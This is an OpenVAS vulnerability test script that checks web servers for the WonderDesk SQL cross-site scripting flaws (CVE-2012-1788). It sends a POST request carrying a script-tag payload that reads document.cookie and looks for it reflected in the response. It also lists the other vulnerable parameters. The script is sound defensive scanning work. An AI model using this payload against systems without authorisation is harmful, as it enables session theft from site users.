###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wonderdesk_mult_xss_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# Wonderdesk SQL Multiple Cross-Site Scripting (XSS) Vulnerabilities
#
# Authors:
# Arun Kallavi <karun@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803625");
  script_version("$Revision: 13659 $");
  script_cve_id("CVE-2012-1788");
  script_bugtraq_id(52193);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2013-06-03 15:30:38 +0530 (Mon, 03 Jun 2013)");
  script_name("Wonderdesk SQL Multiple Cross-Site Scripting (XSS) Vulnerabilities");

  script_xref(name:"URL", value:"http://secunia.com/advisories/48167");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/73502");
  script_xref(name:"URL", value:"http://st2tea.blogspot.in/2012/02/wonderdesk-cross-site-scripting.html");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/110224/WonderDesk-Cross-Site-Scripting.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary HTML and script code in a users browser session in context of an
  affected site and launch other attacks.");
  script_tag(name:"affected", value:"Wonderdesk version 4.14, other versions may also be affected");
  script_tag(name:"insight", value:"Multiple flaws due to,

  - Improper sanitization of 'cus_email' parameter to wonderdesk.cgi when 'do'
  is set to 'cust_lostpw'.

  - Improper sanitization of 'help_name', 'help_email', 'help_website', and
  'help_example_url' parameters to wonderdesk.cgi when 'do' is set to
  'hd_modify_record'.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is installed with Wonderdesk SQL and is prone to
  multiple cross-site scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port)){
  exit(0);
}

useragent = http_get_user_agent();
host = http_host_name(port:port);

foreach dir (make_list_unique("/", "/wonderdesk", "/helpdesk", cgi_dirs(port:port))){

  if( dir == "/" ) dir = "";

  sndReq = http_get(item:string(dir, "/wonderdesk.cgi"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:TRUE);

  if(rcvRes && ('>Help Desk' >< rcvRes && "WonderDesk SQL" >< rcvRes ))
  {
    postdata = "do=cust_lostpw&cus_email=%22%3Cscript%3Ealert%28" +
               "document.cookie%29%3C%2Fscript%3E&Submit=Submit";

    req = string("POST ", dir, "/wonderdesk.cgi HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);

    res = http_keepalive_send_recv(port:port, data:req);

    if(res =~ "HTTP/1\.. 200" && "<script>alert(document.cookie)</script>" >< res)
    {
      security_message(port);
      exit(0);
    }
  }
}

exit(99);
